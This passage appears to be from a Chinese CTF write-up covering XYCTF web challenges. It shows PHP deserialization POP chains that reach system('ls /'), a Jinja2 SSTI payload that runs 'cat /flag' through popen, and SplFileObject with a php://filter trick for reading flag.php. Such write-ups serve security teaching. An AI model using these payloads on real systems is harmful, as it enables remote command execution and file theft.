class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pop链</span></span><br><span class="line"><span class="comment">//CCC类-__destruct --&gt; AAA类-__toString--&gt;BBB类-__get --&gt;call_user_func( , )()()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//POST传参 ： a=implode  b=system</span></span><br><span class="line"><span class="comment">// implode() ：将数组的值拼接为一个字符串 ; b是一个数组参数</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s-&gt;c=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;c-&gt;s-&gt;d=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">//d随便填, system(&quot;ls&quot;)(&quot;hello&quot;)不影响命令执行</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);  <span class="comment">//绕过throw ，最后还需要将 i:1 --&gt; i:0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;s:4:&quot;ls /&quot;;s:1:&quot;d&quot;;s:5:&quot;hello&quot;;&#125;s:1:&quot;a&quot;;N;&#125;&#125;i:1;i:0;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;s:4:&quot;ls /&quot;;s:1:&quot;d&quot;;s:5:&quot;hello&quot;;&#125;s:1:&quot;a&quot;;N;&#125;&#125;i:0;i:0;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//XYCTF&#123;28f226e7-a5a7-485d-972e-4c58d8abbb3e&#125;</span></span><br></pre></td></tr></table></figure><h3 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h3><p>username  :  admin<br>密码：asdqwe</p><p>关键在于要有中文，还是一个中文一个{}，两个中文就是<code>&#123;&#123;&#125;&#125;</code>，三个中文又是{}，做题的时候就是卡在这里了，题目说了只是一个会说英文的复读机，之前还真就没去试过中文，直接就放弃了</p><p>不然 <code>&#123;&#123;&#125;&#125; </code>和 <code>&#123;%%&#125;</code>都被过滤了，无法ssti注入<br>直接使用 request </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">离谱(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read()&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;h=cat /flag</span><br><span class="line"></span><br><span class="line">//XYCTF&#123;3c468048-beb9-409f-8a0a-ffb8dfbdc940&#125;</span><br></pre></td></tr></table></figure><h3 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p>第一步：&amp;符号的运用，直接传参<br> ?pop&#x3D;O:4:”Flag”:2:{s:5:”token”;i:1;s:8:”password”;R:2;}</p><p>结果：<br> fpclosefpclosefpcloseffflllaaaggg.php </p><h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo-&gt;mack=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;num&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;N;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//开始就是 没有$a-&gt;name=&#x27;&#x27;; 这一步，导致一直不能执行成功，一直卡着</span></span><br></pre></td></tr></table></figure><p>然后又进入到下一关：saber_master_saber_master.php</p><h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h5><p>在类里面做一些相应的更改<br>关键点绕过   <code>if ($this-&gt;adwa-&gt;crypto0 != &#39;dev1l&#39; or $this-&gt;adwa-&gt;T1ng != &#39;yuroandCMD258&#39;)</code><br>直接在 XYCTFNO1 类里面添加属性$crypto0， 再更改相应的__construct 赋值<br>在 XYCTFNO3 类里面直接给 $N1ght &#x3D; “oSthing”  赋值<br>最后利用到   <code>new $_POST[&#39;X&#39;]($_POST[&#39;Y&#39;]);</code>  ,使用    <strong>SplFileObject</strong>   读取文件flag.php<br>post传参  ：X&#x3D;SplFileObject&amp;Y&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>(直接读flag.php 没有回显，所以使用伪协议)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$crypto0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$T1ng</span>, <span class="variable">$crypto0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0=<span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;adwa=<span class="variable">$adwa</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>(<span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>(<span class="string">&#x27;dev1l&#x27;</span>,<span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>(<span class="string">&#x27;yuroandCMD258&#x27;</span>,<span class="string">&#x27;dev1l&#x27;</span>)),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:8:&quot;XYCTFNO3&quot;:3:&#123;s:7:&quot;KickyMu&quot;;O:8:&quot;XYCTFNO2&quot;:2:&#123;s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;s:4:&quot;adwa&quot;;O:8:&quot;XYCTFNO1&quot;:4:&#123;s:3:&quot;Liu&quot;;N;s:4:&quot;T1ng&quot;;s:13:&quot;yuroandCMD258&quot;;s:17:&quot; XYCTFNO1 upsw1ng&quot;;N;s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;&#125;&#125;s:7:&quot;fpclose&quot;;i:1;s:5:&quot;N1ght&quot;;s:7:&quot;oSthing&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h5><p>利用 stdClass() 类，实例化直接赋值   $crypto0 &#x3D; ‘dev1l’     ，   $T1ng &#x3D; ‘yuroandCMD258’<br>post传参依旧是 X&#x3D;SplFileObject&amp;Y&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span 